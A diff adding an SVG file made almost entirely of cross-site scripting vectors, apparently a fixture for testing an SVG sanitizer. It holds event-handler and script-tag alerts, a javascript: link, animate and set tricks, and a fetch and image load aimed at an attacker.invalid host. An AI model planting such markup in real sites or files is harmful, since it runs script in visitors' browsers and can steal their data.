@@ -1,0 +1,15 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64" onload="alert(1)">
+  <script><![CDATA[fetch("https://attacker.invalid/steal")]]></script>
+  <foreignObject width="64" height="64">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <script>alert(document.domain)</script>
+    </body>
+  </foreignObject>
+  <a href="javascript:alert(1)">
+    <text x="4" y="20">safe label</text>
+  </a>
+  <rect width="64" height="64" fill="#eef" onclick="alert(2)" onmouseover="alert(3)"/>
+  <animate attributeName="href" values="#safe;https://attacker.invalid/x.svg"/>
+  <set attributeName="onload" to="alert(4)"/>
+  <image href="https://attacker.invalid/payload.svg" width="64" height="64"/>
+</svg>
